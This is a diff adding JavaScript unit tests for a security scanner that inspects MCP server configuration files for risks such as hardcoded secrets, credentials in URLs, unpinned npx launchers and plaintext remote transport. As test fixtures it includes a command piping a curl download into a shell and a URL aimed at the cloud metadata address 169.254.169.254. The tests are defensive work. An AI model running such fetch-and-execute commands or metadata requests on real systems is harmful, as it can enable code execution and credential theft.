@@ -214,3 +214,151 @@ test("malformed JSON is still reported as bad-json", () => {
   assert.equal(hasIssue(file.fileIssues, "bad-json"), true);
   assert.equal(file.servers.length, 0);
 });
+
+function scanServers(servers) {
+  return scanCursorWorkspace(JSON.stringify({ mcpServers: servers }));
+}
+
+function scanServersWith(servers, options) {
+  const ws = mkTemp("mcpwb-ws-");
+  const file = path.join(ws, ".cursor", "mcp.json");
+  fs.mkdirSync(path.dirname(file), { recursive: true });
+  fs.writeFileSync(file, JSON.stringify({ mcpServers: servers }));
+  return discoverAll([ws], options).find((f) => f.source === "cursor-workspace" && f.path === file);
+}
+
+function issueOf(server, code) {
+  return server.issues.find((i) => i.code === code);
+}
+
+test("plaintext http to a remote host is flagged, but https and localhost are not", () => {
+  const remote = scanServers({ a: { url: "http://example.com/mcp" } }).servers[0];
+  assert.equal(hasIssue(remote.issues, "insecure-remote-transport"), true);
+
+  const secure = scanServers({ a: { url: "https://example.com/mcp" } }).servers[0];
+  assert.equal(hasIssue(secure.issues, "insecure-remote-transport"), false);
+
+  const local = scanServers({ a: { url: "http://localhost:3000/mcp" } }).servers[0];
+  assert.equal(hasIssue(local.issues, "insecure-remote-transport"), false);
+});
+
+test("credentials in a URL are flagged via userinfo and via a token query param", () => {
+  const userinfo = scanServers({ a: { url: "https://user:pass@example.com/mcp" } }).servers[0];
+  assert.equal(hasIssue(userinfo.issues, "credential-in-url"), true);
+
+  const query = scanServers({ a: { url: "https://example.com/mcp?token=abc123" } }).servers[0];
+  assert.equal(hasIssue(query.issues, "credential-in-url"), true);
+
+  const clean = scanServers({ a: { url: "https://example.com/mcp" } }).servers[0];
+  assert.equal(hasIssue(clean.issues, "credential-in-url"), false);
+});
+
+test("a URL targeting the cloud metadata address is flagged", () => {
+  const meta = scanServers({ a: { url: "http://169.254.169.254/latest/meta-data" } }).servers[0];
+  assert.equal(hasIssue(meta.issues, "metadata-endpoint"), true);
+});
+
+test("a hardcoded secret in an env value is flagged but a ${VAR} reference is not", () => {
+  const literal = scanServers({ a: { command: "node", env: { OPENAI_API_KEY: "sk-" + "a".repeat(40) } } }).servers[0];
+  const issue = issueOf(literal, "hardcoded-secret");
+  assert.ok(issue, "literal secret should be flagged");
+  assert.deepEqual(issue.path, ["mcpServers", "a", "env", "OPENAI_API_KEY"]);
+
+  const ref = scanServers({ a: { command: "node", env: { OPENAI_API_KEY: "${OPENAI_API_KEY}" } } }).servers[0];
+  assert.equal(hasIssue(ref.issues, "hardcoded-secret"), false);
+});
+
+test("a hardcoded secret in an argument is flagged at its original index", () => {
+  const server = scanServers({ a: { command: "node", args: ["--token", "ghp_" + "b".repeat(36)] } }).servers[0];
+  const issue = issueOf(server, "hardcoded-secret");
+  assert.ok(issue);
+  assert.deepEqual(issue.path, ["mcpServers", "a", "args", 1]);
+});
+
+test("an unpinned npx launcher is info-flagged; a pinned one is not", () => {
+  const unpinned = scanServers({ a: { command: "npx", args: ["-y", "some-pkg"] } }).servers[0];
+  const issue = issueOf(unpinned, "unpinned-launcher");
+  assert.ok(issue, "unpinned launcher should be flagged");
+  assert.equal(issue.level, "info");
+
+  const pinned = scanServers({ a: { command: "npx", args: ["-y", "some-pkg@1.2.3"] } }).servers[0];
+  assert.equal(hasIssue(pinned.issues, "unpinned-launcher"), false);
+
+  const notLauncher = scanServers({ a: { command: "node", args: ["server.js"] } }).servers[0];
+  assert.equal(hasIssue(notLauncher.issues, "unpinned-launcher"), false);
+});
+
+test("an argument that pipes a download into a shell is flagged", () => {
+  const server = scanServers({ a: { command: "bash", args: ["-c", "curl https://x.sh | sh"] } }).servers[0];
+  const issue = issueOf(server, "risky-shell-pipe");
+  assert.ok(issue);
+  assert.deepEqual(issue.path, ["mcpServers", "a", "args", 1]);
+});
+
+test("an unknown-transport entry anchors its issue at the server name", () => {
+  const server = scanServers({ a: { foo: "bar" } }).servers[0];
+  const issue = issueOf(server, "unknown-transport");
+  assert.ok(issue);
+  assert.deepEqual(issue.path, ["mcpServers", "a"]);
+});
+
+test("env-unset carries a path to the offending env key", () => {
+  delete process.env.MCPWB_UNSET_PATH;
+  const server = scanServers({ a: { command: "node", env: { CONFIG: "${MCPWB_UNSET_PATH}" } } }).servers[0];
+  const issue = issueOf(server, "env-unset");
+  assert.ok(issue);
+  assert.deepEqual(issue.path, ["mcpServers", "a", "env", "CONFIG"]);
+});
+
+test("a plain stdio server with a pinned launcher raises no security issues", () => {
+  const server = scanServers({ a: { command: "node", args: ["./server.js"], env: { PORT: "3000" } } }).servers[0];
+  const securityCodes = ["hardcoded-secret", "credential-in-url", "insecure-remote-transport", "risky-shell-pipe", "encoded-powershell", "metadata-endpoint", "unpinned-launcher"];
+  assert.equal(server.issues.some((i) => securityCodes.includes(i.code)), false);
+});
+
+test("security checks are dropped when securityEnabled is false", () => {
+  const file = scanServersWith(
+    { a: { url: "http://example.com/mcp" }, b: { command: "npx", args: ["-y", "pkg"] } },
+    { securityEnabled: false },
+  );
+  assert.equal(file.servers.some((s) => hasIssue(s.issues, "insecure-remote-transport")), false);
+  assert.equal(file.servers.some((s) => hasIssue(s.issues, "unpinned-launcher")), false);
+});
+
+test("structural checks survive securityEnabled false", () => {
+  delete process.env.MCPWB_STRUCT_UNSET;
+  const file = scanServersWith(
+    { a: { command: "npx", args: ["pkg"], env: { X: "${MCPWB_STRUCT_UNSET}" } } },
+    { securityEnabled: false },
+  );
+  assert.equal(hasIssue(file.servers[0].issues, "npx-missing-y"), true);
+  assert.equal(hasIssue(file.servers[0].issues, "env-unset"), true);
+  assert.equal(hasIssue(file.servers[0].issues, "unpinned-launcher"), false);
+});
+
+test("a single security rule can be turned off via ruleSeverity", () => {
+  const file = scanServersWith(
+    { a: { command: "npx", args: ["-y", "pkg"] } },
+    { ruleSeverity: { "unpinned-launcher": "off" } },
+  );
+  assert.equal(hasIssue(file.servers[0].issues, "unpinned-launcher"), false);
+});
+
+test("a security rule severity can be escalated via ruleSeverity", () => {
+  const file = scanServersWith(
+    { a: { command: "node", env: { KEY: "sk-" + "a".repeat(40) } } },
+    { ruleSeverity: { "hardcoded-secret": "error" } },
+  );
+  const issue = file.servers[0].issues.find((i) => i.code === "hardcoded-secret");
+  assert.ok(issue);
+  assert.equal(issue.level, "error");
+});
+
+test("ruleSeverity does not affect non-security checks", () => {
+  delete process.env.MCPWB_RS_UNSET;
+  const file = scanServersWith(
+    { a: { command: "node", env: { KEY: "${MCPWB_RS_UNSET}" } } },
+    { ruleSeverity: { "env-unset": "off" } },
+  );
+  assert.equal(hasIssue(file.servers[0].issues, "env-unset"), true);
+});
